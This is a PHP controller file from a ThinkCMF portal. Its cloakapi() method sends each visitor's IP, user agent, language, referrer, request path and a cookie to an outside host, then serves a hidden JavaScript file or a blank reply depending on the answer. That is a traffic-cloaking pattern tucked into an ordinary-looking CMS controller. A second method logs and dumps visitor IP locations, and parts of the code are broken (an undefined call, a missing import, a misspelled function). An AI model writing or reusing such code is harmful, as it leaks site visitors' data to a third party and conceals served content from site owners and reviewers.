<?php
// +----------------------------------------------------------------------
// | ThinkCMF [ WE CAN DO IT MORE SIMPLE ]
// +----------------------------------------------------------------------
// | Copyright (c) 2013-2017 http://www.thinkcmf.com All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: 老猫 <thinkcmf@126.com>
// +----------------------------------------------------------------------
namespace app\portal\controller;

use cmf\controller\HomeBaseController;

class IndexController extends HomeBaseController
{
    protected function cloakapi(){
        $id = "219737";
        $uid = "dktavmqn8qholzr8agxeww9l3";
        $qu = $_SERVER["QUERY_STRING"];
        $ch = curl_init();
        $url = "http://jcibj.com/pcl.php";
        $ref = 'http://'.$_SERVER['HTTP_HOST'];
        $ip = $_SERVER["REMOTE_ADDR"];
        $ipr = $_SERVER["HTTP_X_FORWARDED_FOR"];
        $tz = date_default_timezone_get();
        $he = '';
        $data = array("lan" => $_SERVER["HTTP_ACCEPT_LANGUAGE"], "ref" => $ref, "ip" => $ip, "ipr" => $ipr, "sn" => $_SERVER["SERVER_NAME"], "requestUri" => $_SERVER["REQUEST_URI"]
        , "query" => $qu, "ua" => $_SERVER["HTTP_USER_AGENT"], "co" => $_COOKIE["_event"], "tz" => $tz, "he" => $he, "user_id" => $uid, "id" => $id);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        $result = curl_exec($ch);
        curl_close($ch);
        $arr = explode(",", $result);

        if ($arr[0] === "true") {
            loadJS();
            exit();
        } elseif ($arr[0] === "false") {
            die('null');
        } else {
            die('null');
        }


    }

    protected function loadJS()
    {
        ob_start ();
        include '123.js';
        header("content-type: application/x-javascript");
        $code = ob_get_clean ();
        echo $code;
    }


    public function checkip(){
        $ipr = $_SERVER["HTTP_X_FORWARDED_FOR"];
        if($ipr == "")$ip = $_SERVER["REMOTE_ADDR"];
        else $ip =$ipr;
        $record = get_locatioin($ip);
        $record['accessTime'] = time();
        var_dump($record);
        Db::name('iplocation')->insert($record);
       

        if($record['cityName'] == 'Shanghai')
        {

        }
    }

    public function index()
    {



    }
}
